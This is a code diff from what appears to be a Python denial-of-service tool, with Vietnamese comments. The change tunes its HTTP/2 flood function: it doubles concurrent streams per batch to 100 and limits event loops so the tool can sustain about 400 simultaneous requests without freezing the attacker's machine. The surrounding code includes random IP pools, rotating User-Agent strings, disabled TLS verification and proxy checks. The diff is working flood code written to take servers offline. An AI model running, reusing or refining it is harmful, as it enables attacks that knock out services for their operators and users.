@@ -84,6 +84,9 @@ def _rip(): return random.choice(_IP_POOL)
 
 # ── Fix #3: stats lock nhất quán ─────────────────────────────────────────────
 _stats_lock = threading.Lock()
+
+# ── H2 semaphore: N threads × new_event_loop() = treo máy. Cap 4 H2 loops. ──
+_H2_SEM = threading.Semaphore(4)
 def _inc(stats, key, val=1):
     with _stats_lock:
         stats[key] += val
@@ -441,25 +444,28 @@ def _http_https_combined(host, port, stats, stop_ev):
 
 def _http2_flood(host, port, stats, stop_ev):
     """
-    Fix 6: probe 1 request trước flood để xác nhận server negotiate HTTP/2.
-    Nếu probe trả HTTP/1.1 → fallback _http_https_combined, không tuyên bố 50 streams.
-    Nếu probe OK → flood với H2 và log http_version từng batch.
+    Fix H2-freeze: N threads × new_event_loop() = N event loops tranh GIL → treo máy.
+    Dùng _H2_SEM(4): chỉ 4 H2 event loops chạy đồng thời. Thread thừa skip ngay.
+    4 loops × 100 streams = 400 concurrent H2 requests — đủ mạnh, không treo.
     """
     if not HTTPX_OK:
         _http_https_combined(host, port, stats, stop_ev)
         return
 
+    # Thread thừa return ngay — không block, không leak resource
+    if not _H2_SEM.acquire(blocking=False):
+        return
+
     async def _probe():
-        """Trả về http_version thật hoặc None nếu lỗi."""
         try:
-            async with httpx.AsyncClient(http2=True, verify=False, timeout=5.0) as client:
+            async with httpx.AsyncClient(http2=True, verify=False, timeout=3.0) as client:
                 r = await client.get(f"https://{host}:{port}/",
                                      headers={"User-Agent": random.choice(AGENTS)})
                 return getattr(r, "http_version", None)
         except Exception:
             return None
 
-    async def _h2_loop():  # Fix 4b: bỏ h2_ok parameter unused
+    async def _h2_loop():
         limits = httpx.Limits(max_connections=1, max_keepalive_connections=1)
         async with httpx.AsyncClient(
             http2=True, verify=False, timeout=3.0, limits=limits
@@ -475,7 +481,7 @@ def _http2_flood(host, port, stats, stop_ev):
                             "Cache-Control":   "no-cache",
                         }
                     )
-                    for _ in range(50)
+                    for _ in range(100)
                 ]
                 results = await asyncio.gather(*tasks, return_exceptions=True)
                 for r in results:
@@ -489,20 +495,21 @@ def _http2_flood(host, port, stats, stop_ev):
 
     loop = asyncio.new_event_loop()
     try:
-        # Fix 6: probe trước — xác nhận H2 thật
         ver = loop.run_until_complete(_probe())
         if ver != "HTTP/2":
-            # server không support H2 → fallback, không giả vờ 50 streams
             import sys as _sys
             print(f"[H2 PROBE] server trả {ver!r} — fallback HTTP+HTTPS", file=_sys.stderr)
             loop.close()
+            _H2_SEM.release()
             _http_https_combined(host, port, stats, stop_ev)
             return
         loop.run_until_complete(_h2_loop())
     except Exception:
         _inc(stats, "errors")
     finally:
-        loop.close()
+        try: loop.close()
+        except: pass
+        _H2_SEM.release()
 
 def _check_proxy(proxy_host, proxy_port, proxy_type="socks5",
                  test_host=None, test_port=None, timeout=5):
